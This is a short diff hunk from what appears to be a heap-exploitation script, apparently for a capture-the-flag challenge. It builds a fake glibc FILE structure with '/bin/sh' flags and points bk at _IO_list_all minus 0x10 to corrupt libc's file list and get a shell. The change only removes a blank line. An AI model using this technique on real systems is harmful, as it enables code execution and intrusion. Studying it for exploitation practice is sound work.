@@ -88,7 +88,6 @@ flags = "/bin/sh\x00"
 size = 0x61 # because chain at 0x60 small bin
 fd = 0xdeadbeef # skipped
 bk = libc.sym["_IO_list_all"] - 0x10 # we want to overwrite _IO_list_all
-
 write_base = 0x1
 write_ptr = 0x2
 mode = 0x0
